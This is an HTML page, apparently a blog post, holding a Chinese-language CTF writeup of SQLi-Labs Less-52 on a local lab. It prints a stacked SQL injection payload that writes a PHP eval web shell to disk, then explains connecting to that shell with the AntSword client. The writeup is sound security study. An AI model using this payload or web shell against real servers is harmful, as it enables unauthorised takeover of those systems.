@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-52 盲堆叠注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-52 盲堆叠注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, ORDER BY注入, 堆叠注入, WebShell, 盲注</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-52 (GET - ORDER BY - Stacked Query - Blind)</li>
+        <li><strong>提示：</strong>注入点为 <code>sort</code> 参数，纯数字型 <code>ORDER BY $id</code>，支持多语句执行，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Less-50 的盲注版本。后端使用了 <code>mysqli_multi_query()</code> 支持堆叠执行，且为纯数字型注入。</p>
+    <p><strong>盲区特性：</strong>页面不会展示任何由第二条 SQL 语句（如 <code>INSERT</code> 或 <code>INTO OUTFILE</code>）产生的结果或报错。由于第一条 <code>SELECT</code> 语句能成功执行并渲染正常表格，写文件操作完全在后台静默执行，必须通过检查物理文件系统来验证是否成功。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：中国蚁剑</h3>
+    <ul>
+        <li>URL 地址：<code>http://localhost/sqli-labs-master/Less-52/shell.php</code></li>
+        <li>连接密码：<code>cmd</code></li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：构造盲堆叠 Payload 写马</strong></p>
+    <p><strong>输入 URL：</strong><code>?sort=1; select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-52/shell.php'-- -</code></p>
+    <p><strong>回显现象：</strong>页面正常渲染用户列表（如 Dumb/Dumb 等）。没有任何写入成功的提示。</p>
+    <p><strong>解释与原理：</strong>直接使用分号 <code>;</code> 截断原有的 <code>ORDER BY</code> 查询，并在后方拼接写文件语句。</p>
+
+    <p><strong>第二步：本地验证与连接</strong></p>
+    <p>前往物理路径 <code>D:\phpstudy_pro\WWW\sqli-labs-master\Less-52\</code>，确认 <code>shell.php</code> 已生成（1KB）。使用蚁剑建立连接，成功进入文件管理界面，可接管服务器文件。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>盲执行的验证：</strong>在盲堆叠场景下，不能依赖页面回显来判断执行结果。必须将注意力转移到服务器物理层面（文件是否落地）。</li>
+        <li><strong>前端页面的迷惑性：</strong>页面看似正常显示表格，容易让人误以为 Payload 未执行。实际上原查询与恶意写文件操作是独立并行的。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>盲堆叠注入</strong>：在彻底失去回显的情况下，利用堆叠特性直接执行写文件等高危操作。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
